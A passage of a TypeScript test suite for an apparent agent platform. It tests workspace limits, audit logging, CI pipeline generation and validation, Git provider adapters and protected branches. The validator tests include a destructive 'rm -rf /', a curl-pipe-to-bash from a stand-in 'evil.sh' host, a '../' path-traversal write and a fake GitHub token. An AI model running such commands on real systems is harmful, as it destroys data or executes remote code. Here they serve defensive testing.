      name: "P3 files: unauthorized write is denied (VIEWER)",
      category: "p3-files",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_file_uwrite" });
        created.workspaces.push(ws.id);
        await services.workspaces.activate(ownerUser, ws.id);
        await expectThrow(() => services.workspaces.writeFile(scratchUser, ws.id, "a.txt", "x"), "permission");
      },
    },
    {
      name: "P3 files: file size limit is enforced",
      category: "p3-files",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_file_size" });
        created.workspaces.push(ws.id);
        await services.workspaces.activate(ownerUser, ws.id);
        const big = "x".repeat(DEFAULT_WORKSPACE_LIMITS.max_file_bytes + 1);
        await expectThrow(() => services.workspaces.writeFile(ownerUser, ws.id, "big.txt", big), "limit");
      },
    },
    {
      name: "P3 files: file count limit is enforced (configurable)",
      category: "p3-files",
      fn: async () => {
        const projectId = await p3Project();
        const tight = new WorkspaceService({
          engine: services.engine,
          authz: services.authz,
          audit: services.audit,
          events: services.events,
          policy: new FileAccessPolicy(),
          limits: { ...DEFAULT_WORKSPACE_LIMITS, max_file_count: 3 },
        });
        const ws = await tight.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_file_count" });
        created.workspaces.push(ws.id);
        await tight.activate(ownerUser, ws.id);
        await tight.writeFile(ownerUser, ws.id, "1.txt", "a");
        await tight.writeFile(ownerUser, ws.id, "2.txt", "b");
        await tight.writeFile(ownerUser, ws.id, "3.txt", "c");
        await expectThrow(() => tight.writeFile(ownerUser, ws.id, "4.txt", "d"), "limit");
      },
    },
    {
      name: "P3 files: total workspace size limit is enforced (configurable)",
      category: "p3-files",
      fn: async () => {
        const projectId = await p3Project();
        const tight = new WorkspaceService({
          engine: services.engine,
          authz: services.authz,
          audit: services.audit,
          events: services.events,
          policy: new FileAccessPolicy(),
          limits: { ...DEFAULT_WORKSPACE_LIMITS, max_total_bytes: 1000, max_file_bytes: 600 },
        });
        const ws = await tight.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_file_total" });
        created.workspaces.push(ws.id);
        await tight.activate(ownerUser, ws.id);
        await tight.writeFile(ownerUser, ws.id, "a.txt", "x".repeat(600));
        await expectThrow(() => tight.writeFile(ownerUser, ws.id, "b.txt", "y".repeat(600)), "limit");
      },
    },

    /* ------------------------------- Execution ------------------------------ */
    {
      name: "P3 exec: an agent execution is bound to exactly one owned workspace",
      category: "p3-exec",
      fn: async () => {
        const projectId = await p3Project();
        const execId = "aex_p3_exec_one";
        created.agentExecs.push(execId);
        const rec = await services.agentExec.run({ actor: ownerUser, agentId: "nexus.inspector", operation: "PROJECT_INSPECT" as OperationType, projectId, executionId: execId, requestText: "inspect me" });
        assert(rec.status === "SUCCEEDED", `run must succeed, got ${rec.status}`);
        const wss = await services.engine.byIndex<WorkspaceRecord>("workspaces", "byExecution", execId);
        assert(wss.length === 1, `exactly one workspace per execution, got ${wss.length}`);
        assert(wss[0].owner_identity_id === ownerUser.id, "workspace owned by the executing identity");
      },
    },
    {
      name: "P3 exec: a different identity cannot access the execution's workspace",
      category: "p3-exec",
      fn: async () => {
        const projectId = await p3Project();
        const execId = "aex_p3_exec_foreign";
        created.agentExecs.push(execId);
        await services.agentExec.run({ actor: ownerUser, agentId: "nexus.inspector", operation: "PROJECT_INSPECT" as OperationType, projectId, executionId: execId, requestText: "inspect" });
        const wss = await services.engine.byIndex<WorkspaceRecord>("workspaces", "byExecution", execId);
        assert(wss.length === 1, "workspace exists");
        await expectThrow(() => services.workspaces.readFile(owner2User, wss[0].id, "a.txt"), "workspace");
      },
    },
    {
      name: "P3 exec: workspace is cleaned up after success",
      category: "p3-exec",
      fn: async () => {
        const projectId = await p3Project();
        const execId = "aex_p3_exec_clean_ok";
        created.agentExecs.push(execId);
        await services.agentExec.run({ actor: ownerUser, agentId: "nexus.inspector", operation: "PROJECT_INSPECT" as OperationType, projectId, executionId: execId, requestText: "inspect" });
        const wss = await services.engine.byIndex<WorkspaceRecord>("workspaces", "byExecution", execId);
        assert(wss[0].status === "DESTROYED", `workspace must be DESTROYED after success, got ${wss[0].status}`);
      },
    },
    {
      name: "P3 exec: workspace is cleaned up after agent failure",
      category: "p3-exec",
      fn: async () => {
        const failKernel = new NexusKernel();
        const failSvc = await failKernel.boot();
        class FailingAgent implements Agent {
          definition = { id: "nexus.p3.failing", name: "Failing", description: "returns failure", version: "1.0.0", capabilities: ["inspect" as const], required_permissions: ["agent:execute" as const], risk_level: "LOW" as const };
          async execute() {
            return { status: "failed" as const, summary: "deliberate failure", error: toSystemError(Err.runtime("FORCED", "forced failure")) };
          }
        }
        failSvc.registry.register(new FailingAgent());
        const projectId = await p3Project();
        const execId = "aex_p3_exec_clean_fail";
        created.agentExecs.push(execId);
        const rec = await failSvc.agentExec.run({ actor: ownerUser, agentId: "nexus.p3.failing", operation: "PROJECT_INSPECT" as OperationType, projectId, executionId: execId, requestText: "fail" });
        assert(rec.status === "FAILED", "must be FAILED");
        const wss = await failSvc.engine.byIndex<WorkspaceRecord>("workspaces", "byExecution", execId);
        assert(wss.length === 1 && wss[0].status === "DESTROYED", "workspace cleaned after failure");
      },
    },
    {
      name: "P3 exec: workspace is cleaned up after an agent exception (interruption)",
      category: "p3-exec",
      fn: async () => {
        const failKernel = new NexusKernel();
        const failSvc = await failKernel.boot();
        class ThrowingAgent implements Agent {
          definition = { id: "nexus.p3.throwing", name: "Throwing", description: "throws", version: "1.0.0", capabilities: ["inspect" as const], required_permissions: ["agent:execute" as const], risk_level: "LOW" as const };
          async execute(): Promise<never> {
            throw new Error("forced exception");
          }
        }
        failSvc.registry.register(new ThrowingAgent());
        const projectId = await p3Project();
        const execId = "aex_p3_exec_clean_throw";
        created.agentExecs.push(execId);
        const rec = await failSvc.agentExec.run({ actor: ownerUser, agentId: "nexus.p3.throwing", operation: "PROJECT_INSPECT" as OperationType, projectId, executionId: execId, requestText: "throw" });
        assert(rec.status === "FAILED", "thrown agent must be FAILED");
        assert(rec.error?.code === "AGENT_EXECUTION_FAILED", "real error preserved");
        const wss = await failSvc.engine.byIndex<WorkspaceRecord>("workspaces", "byExecution", execId);
        assert(wss.length === 1 && wss[0].status === "DESTROYED", "workspace cleaned after exception");
      },
    },
    {
      name: "P3 exec: an expired workspace cannot be activated for execution",
      category: "p3-exec",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_exec_exp" });
        created.workspaces.push(ws.id);
        const stored = await services.engine.get<WorkspaceRecord>("workspaces", ws.id);
        assert(stored, "workspace must exist");
        stored.expires_at = Date.now() - 1000;
        await services.engine.put("workspaces", ws.id, stored);
        await expectThrow(() => services.workspaces.activate(ownerUser, ws.id), "expired");
      },
    },

    /* -------------------------------- Security ------------------------------ */
    {
      name: "P3 audit: denied path access is audited with classification",
      category: "p3-audit",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_aud_path" });
        created.workspaces.push(ws.id);
        await services.workspaces.activate(ownerUser, ws.id);
        await services.workspaces.writeFile(ownerUser, ws.id, "../leak.txt", "x").catch(() => undefined);
        const audit = await services.audit.list(100);
        const rec = audit.find((a) => a.action === "workspace.path.blocked" && a.resource_id === ws.id);
        assert(rec, "path denial audited");
        assert((rec.metadata as Record<string, unknown>).classification === "traversal", "classification recorded");
      },
    },
    {
      name: "P3 audit: workspace creation is audited",
      category: "p3-audit",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_aud_create" });
        created.workspaces.push(ws.id);
        const audit = await services.audit.list(100);
        assert(audit.some((a) => a.action === "workspace.created" && a.resource_id === ws.id), "creation audited");
      },
    },
    {
      name: "P3 audit: workspace cleanup is audited (started + completed)",
      category: "p3-audit",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_aud_clean" });
        created.workspaces.push(ws.id);
        await services.workspaces.cleanup(ownerUser, ws.id);
        const audit = await services.audit.list(100);
        assert(audit.some((a) => a.action === "workspace.cleanup.started" && a.resource_id === ws.id), "cleanup.started audited");
        assert(audit.some((a) => a.action === "workspace.cleanup.completed" && a.resource_id === ws.id), "cleanup.completed audited");
      },
    },
    {
      name: "P3 audit: security preview agrees with the actual execution decision",
      category: "p3-audit",
      fn: async () => {
        const projectId = await p3Project();
        const execId = "aex_p3_aud_prev";
        created.agentExecs.push(execId);
        const preview = services.agentExec.preview({ actor: ownerUser, agentId: "nexus.inspector", operation: "PROJECT_INSPECT" as OperationType, projectId, executionId: execId });
        const rec = await services.agentExec.run({ actor: ownerUser, agentId: "nexus.inspector", operation: "PROJECT_INSPECT" as OperationType, projectId, executionId: execId, requestText: "preview" });
        assert(preview.verdict === rec.decision, `preview ${preview.verdict} must equal run decision ${rec.decision}`);
      },
    },
    {
      name: "P3 audit: no secret value ever reaches workspace audit records",
      category: "p3-audit",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_aud_secret" });
        created.workspaces.push(ws.id);
        await services.workspaces.activate(ownerUser, ws.id);
        const marker = "SUPERSECRETVALUE_9f3c";
        await services.workspaces.writeFile(ownerUser, ws.id, "s.txt", marker);
        const audit = await services.audit.list(200);
        const joined = JSON.stringify(audit);
        assert(!joined.includes(marker), "file content must never appear in audit records");
      },
    },

    /* ------------------------------- Regression ----------------------------- */
    {
      name: "P3 regression: duplicate execution request does not create a duplicate workspace",
      category: "p3-regression",
      fn: async () => {
        const projectId = await p3Project();
        const execId = "aex_p3_reg_dup";
        created.agentExecs.push(execId);
        const r1 = await services.agentExec.run({ actor: ownerUser, agentId: "nexus.inspector", operation: "PROJECT_INSPECT" as OperationType, projectId, executionId: execId, requestText: "dup" });
        const r2 = await services.agentExec.run({ actor: ownerUser, agentId: "nexus.inspector", operation: "PROJECT_INSPECT" as OperationType, projectId, executionId: execId, requestText: "dup" });
        assert(r1.id === r2.id, "idempotent: same execution record returned");
        const wss = await services.engine.byIndex<WorkspaceRecord>("workspaces", "byExecution", execId);
        assert(wss.length === 1, `duplicate run must not create a second workspace, got ${wss.length}`);
      },
    },
    {
      name: "P3 regression: workspace events preserve strictly-increasing sequence",
      category: "p3-regression",
      fn: async () => {
        const before = await services.events.list(2000);
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_reg_seq" });
        created.workspaces.push(ws.id);
        const after = await services.events.list(2000);
        for (let i = 1; i < after.length; i++) {
          assert(after[i].seq > after[i - 1].seq, "event sequence must be strictly increasing");
        }
        assert(after.length > before.length, "workspace events were emitted");
      },
    },
    {
      name: "P3 regression: Phase-1 authorization behavior is unchanged (VIEWER still denied)",
      category: "p3-regression",
      fn: async () => {
        await expectThrow(() => services.projects.create(scratchUser, { name: "p3-viewer-attempt" }), "permission");
        assert(can(scratchUser, "project:read"), "VIEWER retains read");
        assert(!can(scratchUser, "project:create"), "VIEWER still cannot create");
      },
    },

    /* ============ Phase 3 Pass 3 — CI/CD + Git provider foundation ============ */

    /* --------------------------- Pipeline generation ------------------------- */
    {
      name: "Pass3: Node project generates a valid GitHub Actions pipeline",
      category: "pass3-generation",
      fn: async () => {
        const reader = memReader({ "package.json": JSON.stringify({ name: "n", scripts: { build: "tsc", test: "jest", lint: "eslint ." } }) });
        const det = await new ProjectDetector().detect(reader);
        const plan = buildPlanSafe(det, "github");
        const cfg = new GitHubActionsGenerator().generate(plan, "acme/app");
        assert(cfg.filename === ".github/workflows/nexus-ci.yml", "correct GitHub filename");
        assert(cfg.content.includes("runs-on: ubuntu-latest"), "GitHub job present");
        assert(cfg.content.includes("actions/checkout@v4"), "checkout step present");
        assert(cfg.digest === "", "digest filled by caller (agent) — generator leaves it empty");
        return `generated ${cfg.filename}`;
      },
    },
    {
      name: "Pass3: Node project generates a valid GitLab CI pipeline",
      category: "pass3-generation",
      fn: async () => {
        const reader = memReader({ "package.json": JSON.stringify({ name: "n", scripts: { build: "tsc", test: "jest" } }) });
        const det = await new ProjectDetector().detect(reader);
        const plan = buildPlanSafe(det, "gitlab");
        const cfg = new GitLabCIGenerator().generate(plan, "acme/app");
        assert(cfg.filename === ".gitlab-ci.yml", "correct GitLab filename");
        assert(cfg.content.includes("stages:"), "GitLab stages present");
        assert(!cfg.content.includes("checkout:"), "GitLab has no explicit checkout stage");
        return `generated ${cfg.filename}`;
      },
    },
    {
      name: "Pass3: Python project generates a correct pipeline (pip + pytest)",
      category: "pass3-generation",
      fn: async () => {
        const reader = memReader({ "requirements.txt": "fastapi\nuvicorn\n" });
        const det = await new ProjectDetector().detect(reader);
        assert(det.language === "python", "detects python");
        const plan = buildPlanSafe(det, "github");
        const cfg = new GitHubActionsGenerator().generate(plan, "acme/api");
        assert(cfg.content.includes("pip install -r requirements.txt"), "pip install step");
        assert(cfg.content.includes("pytest"), "pytest step");
        return "python pipeline correct";
      },
    },
    {
      name: "Pass3: TypeScript project generates a correct pipeline",
      category: "pass3-generation",
      fn: async () => {
        const reader = memReader({ "package.json": JSON.stringify({ name: "t", scripts: { build: "tsc", test: "vitest" } }), "tsconfig.json": "{}" });
        const det = await new ProjectDetector().detect(reader);
        assert(det.language === "typescript", "detects typescript");
        const plan = buildPlanSafe(det, "github");
        assert(plan.build_step !== null, "build step present for TS with build script");
        return "typescript pipeline correct";
      },
    },
    {
      name: "Pass3: unsupported/empty project is handled honestly (no invented steps)",
      category: "pass3-generation",
      fn: async () => {
        const reader = memReader({ "README.md": "# nothing" });
        const det = await new ProjectDetector().detect(reader);
        assert(det.language === "unknown", "unknown language reported honestly");
        const plan = buildPlanSafe(det, "github");
        assert(plan.install_step === null, "no invented install step");
        assert(plan.build_step === null, "no invented build step");
        return "unknown project → no fabricated steps";
      },
    },

    /* ------------------------------ Validation ------------------------------- */
    {
      name: "Pass3: valid generated GitHub YAML parses and validates VALID",
      category: "pass3-validation",
      fn: async () => {
        const reader = memReader({ "package.json": JSON.stringify({ name: "n", scripts: { build: "tsc", test: "jest" } }) });
        const det = await new ProjectDetector().detect(reader);
        const plan = buildPlanSafe(det, "github");
        const cfg = new GitHubActionsGenerator().generate(plan, "acme/app");
        const res = new PipelineValidator().validate(cfg, plan);
        assert(res.verdict === "VALID", `expected VALID, got ${res.verdict}: ${JSON.stringify(res.findings)}`);
        return "valid YAML → VALID";
      },
    },
    {
      name: "Pass3: valid generated GitLab YAML parses and validates VALID",
      category: "pass3-validation",
      fn: async () => {
        const reader = memReader({ "package.json": JSON.stringify({ name: "n", scripts: { build: "tsc", test: "jest" } }) });
        const det = await new ProjectDetector().detect(reader);
        const plan = buildPlanSafe(det, "gitlab");
        const cfg = new GitLabCIGenerator().generate(plan, "acme/app");
        const res = new PipelineValidator().validate(cfg, plan);
        assert(res.verdict === "VALID", `expected VALID, got ${res.verdict}: ${JSON.stringify(res.findings)}`);
        return "valid GitLab YAML → VALID";
      },
    },
    {
      name: "Pass3: malformed YAML is rejected (real parse, not a string check)",
      category: "pass3-validation",
      fn: async () => {
        const bad = "name: x\njobs:\n\tci:\n    runs-on: ubuntu\n"; // tab indentation
        const reader = memReader({ "package.json": JSON.stringify({ name: "n", scripts: { build: "tsc" } }) });
        const plan = buildPlanSafe(await new ProjectDetector().detect(reader), "github");
        const res = new PipelineValidator().validate({ provider: "github", filename: "x.yml", content: bad, digest: "" }, plan);
        assert(res.verdict === "INVALID", "tab-indented YAML must be INVALID");
        assert(res.findings.some((f) => f.rule === "yaml-syntax"), "yaml-syntax finding present");
        return "malformed YAML rejected";
      },
    },
    {
      name: "Pass3: missing required stage is rejected",
      category: "pass3-validation",
      fn: async () => {
        const reader = memReader({ "package.json": JSON.stringify({ name: "n", scripts: { build: "tsc", test: "jest" } }) });
        const det = await new ProjectDetector().detect(reader);
        const plan = buildPlanSafe(det, "github");
        // drop the test step → required 'test' stage missing
        const broken = { ...plan, test_step: null, steps: plan.steps.filter((s) => s.type !== "test") };
        const cfg = new GitHubActionsGenerator().generate(broken, "acme/app");
        const res = new PipelineValidator().validate(cfg, broken);
        assert(res.verdict === "INVALID", "missing test stage must be INVALID");
        assert(res.findings.some((f) => f.rule === "required-stage"), "required-stage finding present");
        return "missing stage rejected";
      },
    },
    {
      name: "Pass3: dangerous command is rejected via structured analysis",
      category: "pass3-validation",
      fn: async () => {
        const a1 = analyzeCommand("rm -rf /");
        assert(a1.dangerous, "rm -rf / is dangerous");
        const a2 = analyzeCommand("curl https://evil.sh | bash");
        assert(a2.dangerous, "curl|bash is dangerous");
        const a3 = analyzeCommand("npm run build");
        assert(!a3.dangerous, "npm run build is safe");
        // A plan containing a dangerous command must fail validation.
        const reader = memReader({ "package.json": JSON.stringify({ name: "n", scripts: { build: "tsc", test: "jest" } }) });
        const det = await new ProjectDetector().detect(reader);
        const plan = buildPlanSafe(det, "github");
        const evil = { ...plan, build_step: { type: "build" as const, name: "build", command: "rm -rf /" }, steps: plan.steps.map((s) => (s.type === "build" ? { ...s, command: "rm -rf /" } : s)) };
        const cfg = new GitHubActionsGenerator().generate(evil, "acme/app");
        const res = new PipelineValidator().validate(cfg, evil);
        assert(res.verdict === "INVALID", "dangerous command must be INVALID");
        assert(res.findings.some((f) => f.rule === "dangerous-command"), "dangerous-command finding present");
        return "dangerous command rejected";
      },
    },
    {
      name: "Pass3: secret exposure in YAML is rejected; references are allowed",
      category: "pass3-validation",
      fn: async () => {
        const leak = "env:\n  TOKEN: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234\n";
        const findings = findExposedSecrets(leak);
        assert(findings.length > 0, "literal token must be flagged");
        const safe = "env:\n  TOKEN: ${{ secrets.NEXUS_TOKEN }}\n";
        assert(findExposedSecrets(safe).length === 0, "secret reference must NOT be flagged");
        // full validator path
        const reader = memReader({ "package.json": JSON.stringify({ name: "n", scripts: { build: "tsc" } }) });
        const plan = buildPlanSafe(await new ProjectDetector().detect(reader), "github");
        const cfg = { provider: "github" as const, filename: "x.yml", content: "name: x\njobs:\n  ci:\n" + leak, digest: "" };
        const res = new PipelineValidator().validate(cfg, plan);
        assert(res.verdict === "INVALID", "secret exposure must be INVALID");
        return "secret exposure rejected";
      },
    },
    {
      name: "Pass3: GitHub provider-specific structure is enforced (jobs key)",
      category: "pass3-validation",
      fn: async () => {
        const reader = memReader({ "package.json": JSON.stringify({ name: "n", scripts: { build: "tsc" } }) });
        const plan = buildPlanSafe(await new ProjectDetector().detect(reader), "github");
        const cfg = { provider: "github" as const, filename: "x.yml", content: "name: only-name\n", digest: "" };
        const res = new PipelineValidator().validate(cfg, plan);
        assert(res.findings.some((f) => f.rule === "github-structure"), "github-structure finding present");
        return "provider structure enforced";
      },
    },

    /* ------------------------------ Git provider ----------------------------- */
    {
      name: "Pass3: GitHub provider interface works against a deterministic static fixture",
      category: "pass3-provider",
      fn: async () => {
        const sp = new StaticGitProvider("github");
        sp.seedRepo({ full_name: "acme/app", default_branch: "main", is_private: false }, "sha0");
        const repo = await sp.getRepository("acme", "app");
        assert(repo.full_name === "acme/app", "repo retrieved");
        const branch = await sp.createBranch("acme", "app", devopsBranchName("exec1"), "sha0");
        assert(branch.name === "nexus/devops/exec1", "isolated branch created");
        const commit = await sp.createCommit("acme", "app", branch.name, [{ path: "a.txt", content: "x" }], "msg");
        assert(commit.sha.length > 0, "commit sha produced");
        const pr = await sp.createPullRequest("acme", "app", branch.name, "main", "t", "b");
        assert(pr.number === 1, "PR created");
        assert(sp.kind === "static", "clearly labelled static (not a real remote)");
        return "static fixture interface ok";
      },
    },
    {
      name: "Pass3: GitLab provider interface works against a deterministic static fixture",
      category: "pass3-provider",
      fn: async () => {
        const sp = new StaticGitProvider("gitlab");
        sp.seedRepo({ full_name: "acme/svc", default_branch: "main", is_private: true }, "sha0");
        const branches = await sp.listBranches("acme", "svc");
        assert(branches.length === 1, "seeded branch listed");
        const status = await sp.getPipelineStatus("acme", "svc", "main");
        assert(status === "SUCCEEDED", "static pipeline status");
        return "gitlab static fixture ok";
      },
    },
    {
      name: "Pass3: GitHub provider with no connected token returns BLOCKED (never fakes success)",
      category: "pass3-provider",
      fn: async () => {
        const gh = services.cicd.github; // not connected in this runtime
        await expectThrow(() => gh.listBranches("acme", "app"), "BLOCKED");
        await expectThrow(() => gh.getRepository("acme", "app"), "BLOCKED");
        return "unconnected GitHub → BLOCKED";
      },
    },
    {
      name: "Pass3: GitLab provider remote ops are honestly BLOCKED (no credentials/network)",
      category: "pass3-provider",
      fn: async () => {
        const gl = services.cicd.gitlab;
        await expectThrow(() => gl.listBranches("acme", "app"), "BLOCKED");
        await expectThrow(() => gl.createCommit("acme", "app", "main", [], "m"), "BLOCKED");
        return "GitLab remote → BLOCKED";
      },
    },
    {
      name: "Pass3: no fabricated remote repository state (static ≠ remote)",
      category: "pass3-provider",
      fn: async () => {
        assert(services.cicd.github.kind === "remote", "GitHub adapter is remote-kind");
        assert(services.cicd.gitlab.kind === "remote", "GitLab adapter is remote-kind");
        const sp = new StaticGitProvider("github");
        assert(sp.kind === "static", "fixture is static-kind");
        await expectThrow(() => sp.getRepository("ghost", "none"), "not in static fixture");
        return "no fabricated remote state";
      },
    },

    /* ------------------------------- Branching ------------------------------- */
    {
      name: "Pass3: DevOps branch naming is deterministic and isolated",
      category: "pass3-branch",
      fn: async () => {
        assert(devopsBranchName("exec_1") === "nexus/devops/exec_1", "deterministic naming");
        assert(devopsBranchName("exec_1") === devopsBranchName("exec_1"), "stable across calls");
        assert(!isProtectedBranch("nexus/devops/exec_1"), "devops branch is not protected");
        return "deterministic isolated branch";
      },
    },
    {
      name: "Pass3: protected branch write is denied by default",
      category: "pass3-branch",
      fn: async () => {
        assert(isProtectedBranch("main"), "main protected");
        assert(isProtectedBranch("master"), "master protected");
        assert(isProtectedBranch("production"), "production protected");
        await expectThrow(async () => assertWritableBranch("main"), "protected");
        await expectThrow(async () => assertWritableBranch("production"), "protected");
        assert(assertWritableBranch("nexus/devops/x") === "nexus/devops/x", "isolated branch writable");
        return "protected branches denied";
      },
    },
    {
      name: "Pass3: static provider refuses to create a branch on a protected name",
      category: "pass3-branch",
      fn: async () => {
        const sp = new StaticGitProvider("github");
        sp.seedRepo({ full_name: "acme/app", default_branch: "main", is_private: false }, "sha0");
        await expectThrow(() => sp.createBranch("acme", "app", "main", "sha0"), "protected");
        return "protected branch creation denied";
      },
    },

    /* ----------------------------- Pipeline state ---------------------------- */
    {
      name: "Pass3: CI run QUEUED→RUNNING→SUCCEEDED with legal transitions",
      category: "pass3-state",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "pass3-ci-ok" });
        created.projects.push(p.id);
        const e = await services.executions.createQueued(ownerUser, p.id, "ci run ok");
        created.executions.push(e.id);
        const ctx = ciCtx(ownerUser, p.id, e.id, 1);
        const { run } = await services.cicd.engine.submitRun(ctx, "github", "acme/app", "nexus/devops/x");
        created.ciRuns.push(run.id);
        assert(run.status === "QUEUED", "starts QUEUED");
        // A remote-kind provider that is not connected cannot truly start; use
        // the transition engine directly to prove the state machine.
        const running = await services.cicd.engine.transitionRun(run, "RUNNING", ctx, null);
        assert(running.status === "RUNNING", "QUEUED→RUNNING legal");
        const done = await services.cicd.engine.transitionRun(running, "SUCCEEDED", ctx, null);
        assert(done.status === "SUCCEEDED", "RUNNING→SUCCEEDED legal");
        return "legal CI transitions";
      },
    },
    {
      name: "Pass3: CI run failure produces FAILED with real error",
      category: "pass3-state",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "pass3-ci-fail" });
        created.projects.push(p.id);
        const e = await services.executions.createQueued(ownerUser, p.id, "ci run fail");
        created.executions.push(e.id);
        const ctx = ciCtx(ownerUser, p.id, e.id, 1);
        const { run } = await services.cicd.engine.submitRun(ctx, "github", "acme/app", "nexus/devops/y");
        created.ciRuns.push(run.id);
        await services.cicd.engine.transitionRun(run, "RUNNING", ctx, null);
        await services.cicd.engine.transitionRun(run, "FAILED", ctx, "build exited 1");
        assert(run.status === "FAILED", "FAILED recorded");
        assert(run.error?.message.includes("build exited 1"), "real error preserved");
        return "failure → FAILED";
      },
    },
    {
      name: "Pass3: unavailable provider produces BLOCKED (startRun on static fixture)",
      category: "pass3-state",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "pass3-ci-block" });
        created.projects.push(p.id);
        const e = await services.executions.createQueued(ownerUser, p.id, "ci run blocked");
        created.executions.push(e.id);
        const ctx = ciCtx(ownerUser, p.id, e.id, 1);
        const { run } = await services.cicd.engine.submitRun(ctx, "github", "acme/app", "nexus/devops/z");
        created.ciRuns.push(run.id);
        const sp = new StaticGitProvider("github");
        const after = await services.cicd.engine.startRun(run, ctx, sp);
        assert(after.status === "BLOCKED", "static provider cannot execute a real run → BLOCKED");
        assert(after.blocked_reason !== null, "real blocked reason recorded");
        return "unavailable provider → BLOCKED";
      },
    },
    {
      name: "Pass3: illegal CI transitions are rejected (FAILED→SUCCEEDED, CANCELLED→RUNNING)",
      category: "pass3-state",
      fn: async () => {
        assert(!isLegalCiTransition("FAILED", "SUCCEEDED"), "FAILED→SUCCEEDED illegal");
        assert(!isLegalCiTransition("CANCELLED", "RUNNING"), "CANCELLED→RUNNING illegal");
        assert(!isLegalCiTransition("SUCCEEDED", "RUNNING"), "SUCCEEDED→RUNNING illegal");
        assert(isLegalCiTransition("QUEUED", "RUNNING"), "QUEUED→RUNNING legal");
        const p = await services.projects.create(ownerUser, { name: "pass3-ci-illegal" });
        created.projects.push(p.id);
        const e = await services.executions.createQueued(ownerUser, p.id, "ci illegal");
        created.executions.push(e.id);
        const ctx = ciCtx(ownerUser, p.id, e.id, 1);
        const { run } = await services.cicd.engine.submitRun(ctx, "github", "acme/app", "nexus/devops/i");
        created.ciRuns.push(run.id);
        await services.cicd.engine.transitionRun(run, "RUNNING", ctx, null);
        await services.cicd.engine.transitionRun(run, "FAILED", ctx, "x");
        await expectThrow(() => services.cicd.engine.transitionRun(run, "SUCCEEDED", ctx, null), "illegal CI transition");
        return "illegal transitions rejected";
      },
    },
    {
      name: "Pass3: retry creates a separate attempt (idempotent per attempt)",
      category: "pass3-state",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "pass3-ci-retry" });
        created.projects.push(p.id);
        const e = await services.executions.createQueued(ownerUser, p.id, "ci retry");
        created.executions.push(e.id);
        const ctx1 = ciCtx(ownerUser, p.id, e.id, 1);
        const first = await services.cicd.engine.submitRun(ctx1, "github", "acme/app", "nexus/devops/r");
        created.ciRuns.push(first.run.id);
        const dup = await services.cicd.engine.submitRun(ctx1, "github", "acme/app", "nexus/devops/r");
        assert(!dup.created && dup.run.id === first.run.id, "same attempt is idempotent");
        const ctx2 = ciCtx(ownerUser, p.id, e.id, 2);
        const second = await services.cicd.engine.submitRun(ctx2, "github", "acme/app", "nexus/devops/r");
        created.ciRuns.push(second.run.id);
        assert(second.created && second.run.id !== first.run.id, "new attempt is a distinct run");
        assert(second.run.attempt === 2, "attempt incremented");
        return "retry → separate attempt";
      },
    },

    /* -------------------------------- Security ------------------------------- */
    {
      name: "Pass3: git operations require authorization (VIEWER denied, audited)",
      category: "pass3-security",
      fn: async () => {
        // recordGitOp is invoked by the engine on behalf of an actor; the
        // authorization gate is the RBAC matrix. Prove VIEWER lacks git:write.
        assert(can(ownerUser, "git:write"), "OWNER holds git:write");
        assert(!can(scratchUser, "git:write"), "VIEWER lacks git:write");
        assert(!can(scratchUser, "pipeline:create"), "VIEWER lacks pipeline:create");
        assert(can(scratchUser, "pipeline:read") === false, "VIEWER lacks pipeline:read (deny-by-default)");
        return "RBAC gates git/pipeline ops";
      },
    },
    {
      name: "Pass3: blocked provider operation is recorded + audited honestly",
      category: "pass3-security",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "pass3-gitop" });
        created.projects.push(p.id);
        const e = await services.executions.createQueued(ownerUser, p.id, "git op blocked");
        created.executions.push(e.id);
        const ctx = ciCtx(ownerUser, p.id, e.id, 1);
        const op = await services.cicd.engine.recordGitOp(ctx, "gitlab", "create_branch", "acme/app", { status: "BLOCKED", ref: "nexus/devops/b", reason: "GitLab unavailable" });
        created.gitOps.push(op.id);
        assert(op.status === "BLOCKED", "blocked op recorded");
        const audit = await services.audit.list(100);
        assert(audit.some((a) => a.action === "git.create_branch" && a.result === "info"), "blocked git op audited");
        return "blocked git op audited";
      },
    },
    {
      name: "Pass3: provider credentials never enter model/agent context",
      category: "pass3-security",
      fn: async () => {
        // The GitProvider interface has no credential parameters; GitHubService
        // keeps the token private and exposes only a masked hint.
        const hint = services.github.hint(); // not connected → null
        assert(hint === null, "no token connected, no hint leaked");
        assert(services.github.state().connected === false, "not connected");
        return "no credentials in context";
      },
    },
    {
      name: "Pass3: generated pipelines contain secret references, never values",
      category: "pass3-security",
      fn: async () => {
        const reader = memReader({ "package.json": JSON.stringify({ name: "n", scripts: { build: "tsc" } }) });
        const plan = buildPlanSafe(await new ProjectDetector().detect(reader), "github");
        const cfg = new GitHubActionsGenerator().generate(plan, "acme/app");
        assert(findExposedSecrets(cfg.content).length === 0, "no exposed secrets in generated pipeline");
        assert(!/ghp_[A-Za-z0-9]{20,}/.test(cfg.content), "no literal token");
        return "generated pipeline secret-free";
      },
    },

    /* -------------------------------- Artifacts ------------------------------ */
    {
      name: "Pass3: PipelineAgent registers PIPELINE_CONFIG + VALIDATION_REPORT artifacts with real digests",
      category: "pass3-artifacts",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "pass3-art" });
        created.projects.push(p.id);
